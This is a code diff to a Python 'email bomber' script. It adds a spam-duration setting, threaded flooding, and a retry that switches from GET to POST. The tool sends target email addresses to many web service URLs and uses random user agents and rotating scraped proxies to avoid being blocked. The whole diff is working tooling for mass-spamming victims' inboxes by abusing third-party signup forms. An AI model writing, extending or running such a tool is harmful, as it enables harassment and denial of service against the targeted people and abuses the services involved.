@@ -5,7 +5,6 @@ from argparse import ArgumentParser
 from urllib.request import Request, urlopen
 
 from ua import randomUA
-from servises import SERVS
 from proxyscan import ProxyScanIO  # git clone https://github.com/NIKDISSV-Forever/proxyscan
 
 __banner__ = r"""
@@ -17,13 +16,16 @@ __banner__ = r"""
  |______|____/ \___/|_| |_| |_|_.__/
  """
 
+with open("servises.txt", "r") as f:
+    SERVS = sorted(f.read().split("\n"))
 
 class main:
     
     def __init__(self) -> None:
         self.parseArgs()
         self.argsInit()
-        self.startBomb()
+        Thread(target=self.startBomb, daemon=True).start()
+        
     
     def parseArgs(self) -> None:
         parser = ArgumentParser()
@@ -33,6 +35,9 @@ class main:
                             help="Number of threads")
         parser.add_argument("-X", "--proxy", action="store_true",
                             help="Whether to use a proxy.")
+        parser.add_argument("-D", "--duration", type=int,
+                            default=0,
+                            help="Spam duration.")
         self.args = parser.parse_args()
     
     def argsInit(self) -> None:
@@ -49,7 +54,16 @@ class main:
             self.proxies = None
         else:
             self.askUseProxy()
-    
+        if self.args.duration:
+            self.duration = self.args.duration
+        else:
+            self.askDuration()
+    def askDuration(self):
+        try:
+            self.duration = int(input("Spam duration (0): "))
+        except ValueError:
+            self.duration = 0
+            
     def askUseProxy(self) -> None:
         self.proxy = not input("Use a proxy? (If yes, just press Enter) ")
     
@@ -72,7 +86,6 @@ class main:
     
     find_proxy = False
     proxies = []
-    
     def bomb(self) -> None:
         ua = {"User-Agent": randomUA()}
         for url in SERVS:
@@ -87,30 +100,36 @@ class main:
                         while self.find_proxy:
                             sleep(0.0)
                     self.find_proxy = False
-                
+    
                 ip = None
                 ip_col = "\033[32m"
-                
-                req = Request(url % email, headers=ua)
-                if self.proxy:
-                    ip = choice(self.proxies)
-                    req.set_proxy(ip, type="http")
-                
-                try:
-                    resp = urlopen(req)
-                    code = resp.getcode()
-                except Exception as Error:
-                    if hasattr(Error, "getcode"):
-                        code = Error.getcode()
-                    else:
-                        code = str(Error)
-                        if ip in self.proxies:
-                            self.proxies.remove(ip)
-                        ip_col = "\033[31m"
+    
+                method = "GET"
+                while True:
+                    req = Request(url % email, headers=ua, method=method)
+                    if self.proxy:
+                        ip = choice(self.proxies)
+                        req.set_proxy(ip, type="http")
+                    try:
+                        resp = urlopen(req)
+                        code = resp.getcode()
+                        break
+                    except Exception as Error:
+                        if hasattr(Error, "getcode"):
+                            code = Error.getcode()
+                            if method == "GET":
+                                method = "POST"
+                                continue
+                        else:
+                            code = str(Error)
+                            if ip in self.proxies:
+                                self.proxies.remove(ip)
+                                ip_col = "\033[31m"
+                        break
                 code_col = "\033[31m"
                 serv_col = "\033[32m"
                 if isinstance(code, int):
-                    if 404 <= code <= 500:
+                    if 403 < code < 500:
                         if url in SERVS:
                             SERVS.remove(url)
                         serv_col = "\033[31m"
@@ -119,15 +138,18 @@ class main:
                 email_t = email.split("@")[0]
                 url_t = url.split("/")[2].split(".")[1]
                 print(
-                    f"{code_col}{code}\033[0m | {email_t} | {serv_col}{url_t}\033[0m",
+                    f"{code_col}{code}\033[0m | {email_t} | {serv_col}{method} {url_t}\033[0m",
                     end="")
                 if ip:
                     print(f" | {ip_col}{ip}\033[0m", end="")
                 print()
     
+    threads_list = ()
+    
     def startBomb(self) -> None:
         for _ in range(self.threads):
-            Thread(target=self.bomb).start()
+            self.threads_list += Thread(target=self.bomb, daemon=True),
+            self.threads_list[-1].start()
     
     def needCountProxy(self) -> int:
         return len(self.emails) * self.threads
@@ -135,9 +157,18 @@ class main:
     def getProxies(self) -> None:
         scanner = ProxyScanIO()
         count = self.needCountProxy()
-        self.proxies = list(scanner.get_proxies(count=count, type="http"))
+        self.proxies = list(set(scanner.get_proxies(count=count, type="http")))
+
+    def end(self):
+        with open("servises.txt", "w") as f:
+            f.write("\n".join(SERVS))
 
 
 if __name__ == "__main__":
     print(f"\033[{randint(30, 37)}m{__banner__}\033[0m\033[1m{len(SERVS)}\033[0m")
-    main()
+    process = main()
+    if process.duration != 0:
+        sleep(process.duration)
+        print("\033[36mEnding spam...")
+        process.end()
+        del process
